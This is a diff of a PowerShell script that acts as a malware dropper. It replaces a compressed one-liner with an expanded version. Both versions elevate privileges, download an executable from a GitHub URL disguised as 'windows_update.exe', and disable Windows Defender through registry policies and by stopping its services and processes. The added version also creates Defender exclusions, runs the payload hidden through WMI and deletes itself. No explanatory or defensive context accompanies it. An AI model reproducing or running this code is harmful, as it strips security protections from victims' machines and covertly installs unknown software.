@@ -1,1 +1,85 @@
-$u="https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe";$f="$env:ProgramData\WindowsUpdate";$p="$f\windows_update.exe";if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"$PSCommandPath`"" -Verb RunAs;exit};try{if(!(Test-Path $f)){md $f -Force};iwr $u -OutFile $p -UseBasicParsing;"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender","HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"|%{if(!(Test-Path $_)){ni $_ -Force|Out-Null}};sp "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 1 -Type DWord -Force;sp "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" "DisableRealtimeMonitoring" 1 -Type DWord -Force;"WinDefend","WdNisSvc","Sense","SecurityHealthService"|%{sc stop $_ 2>$null;sc config $_ start=disabled 2>$null};Start-Sleep 2;Start-Process $p -WindowStyle Hidden;Start-Sleep 3;if(Test-Path $PSCommandPath){cmd /c "timeout 3 >nul & del /f /q `"$PSCommandPath`""}}catch{}
+$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe"
+$targetFolder = "C:\ProgramData\WindowsUpdate"
+$exePath = "$targetFolder\windows_update.exe"
+
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`""
+    exit
+}
+
+Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+$c=[C.W]::GetConsoleWindow()
+[C.W]::ShowWindow($c,0)
+
+try {
+    if (-not (Test-Path $targetFolder)) {
+        New-Item -ItemType Directory -Path $targetFolder -Force
+    }
+
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
+
+    $registryPaths = @(
+        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
+        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+    )
+    
+    foreach ($path in $registryPaths) {
+        if (!(Test-Path $path)) {
+            New-Item -Path $path -Force | Out-Null
+        }
+    }
+    
+    $registrySettings = @(
+        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="DWord"},
+        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="DWord"}
+    )
+    
+    foreach ($setting in $registrySettings) {
+        try {
+            Set-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -Type $setting.Type -Force
+        } catch {}
+    }
+
+    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService")
+    foreach ($service in $services) {
+        try {
+            Stop-Service -Name $service -Force
+            Set-Service -Name $service -StartupType Disabled
+            Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
+        } catch {}
+    }
+
+    $processes = @("MsMpEng.exe","NisSrv.exe","MsSense.exe","SecurityHealthService.exe")
+    foreach ($process in $processes) {
+        try {
+            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force
+        } catch {}
+    }
+
+    $e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+    if (!(Test-Path $e)) {
+        New-Item -Path $e -Force | Out-Null
+    }
+    try {
+        New-ItemProperty -Path $e -Name $exePath -PropertyType String -Value "0" -Force
+        New-ItemProperty -Path $e -Name $targetFolder -PropertyType String -Value "0" -Force
+    } catch {}
+
+    Start-Sleep -Seconds 2
+
+    try {
+        $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
+        $r=$w.Create("`"$exePath`"")
+    } catch {
+        try {
+            Start-Process -FilePath $exePath -WindowStyle Hidden
+        } catch {}
+    }
+
+    Start-Sleep -Seconds 3
+
+    $sp=$MyInvocation.MyCommand.Path
+    if (Test-Path $sp) {
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
+    }
+} catch {}
